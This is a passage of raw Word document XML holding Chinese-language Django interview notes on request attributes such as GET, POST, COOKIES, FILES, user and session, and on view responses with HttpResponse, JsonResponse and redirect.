        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>GET属性，获取HTTP GET方式请求传参，的参数（字典类型）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59775902" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>如：http://127.0.0.1:8000/bug/articles/?mch=123 &amp; mim=456</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529E7C50" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>复制代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2513FA0E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.shortcuts import render,HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6CC1A2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094D0F77" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>def special(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C56F0C4" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    print(request.GET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5F734E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    return render(request,'index.html') #向用户显示一个html页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED76AF4" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#返回：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792ED087" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;QueryDict: {' mim': ['456'], 'mch': ['123 ']}&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1402CC99" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># POST： 包含所有HTTP POST参数的类字典对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6FBF4E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0AF63E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 服务器收到空的POST请求的情况也是可能发生的，也就是说，表单form通过</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B957960" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># HTTP POST方法提交请求，但是表单中可能没有数据，因此不能使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005E0AFB" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># if req.POST来判断是否使用了HTTP POST 方法；应该使用 if req.method=="POST"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D7EE04" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>COOKIES: 包含所有cookies的标准Python字典对象；keys和values都是字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D2D717" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539241BB" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># FILES： 包含所有上传文件的类字典对象；FILES中的每一个Key都是&lt;input type="file" name="" /&gt;标签中name属性的值，FILES中的每一个value同时也是一个标准的python字典对象，包含下面三个Keys：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF07B80" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BEABCD" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># filename： 上传文件名，用字符串表示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD1AA31" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># content_type: 上传文件的Content Type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7B0804" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># content： 上传文件的原始内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEF8913" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596A6F0C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633314B2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># user： 是一个django.contrib.auth.models.User对象，代表当前登陆的用户。如果访问用户当前</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39ADDBBD" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 没有登陆，user将被初始化为django.contrib.auth.models.AnonymousUser的实例。你</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD3AACA" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 可以通过user的is_authenticated()方法来辨别用户是否登陆：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4BEC04" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># if req.user.is_authenticated();只有激活Django中的AuthenticationMiddleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AA06C2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 时该属性才可用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D207E2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548546E9" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># session： 唯一可读写的属性，代表当前会话的字典对象；自己有激活Django中的session支持时该属性才可用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFB8303" w14:textId="6BFC0F6A" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>get_full_path()方法，获取HTTP GET方式请求传参，的URL地址</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BB29F9" w14:textId="0ACAB81B" w:rsidR="00717181" w:rsidRDefault="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="94" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>014</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>常用视图响应的方式是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0445D71B" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图的响应返回使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0659C948" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>HttpResponse(content=响应体, content_type=响应体数据类型, status=状态码) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8B888B" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>一般不用这种方式，我习惯使用： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D020C53" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> response = HttpResponse(‘language python’) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429F9834" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> response.status_code = 400 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9EEABD" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> response[‘languaget’] = ‘Python’ </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA04B6D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> return response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9C190B" w14:textId="5578B4FD" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据，可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>JsonResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来构造响应对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E797C41" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>帮助我们将数据转换为json字符串 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A0D1D6" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>设置响应头Content-Type为 application/json </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559EBAE9" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>例子：from django.http import JsonResponse </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45755104" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>           def demo_view(request): </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B1CE29" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>               return JsonResponse({‘city’: ‘beijing’, ‘subject’: ‘python’})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0479ED39" w14:textId="08CB92B8" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redirect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
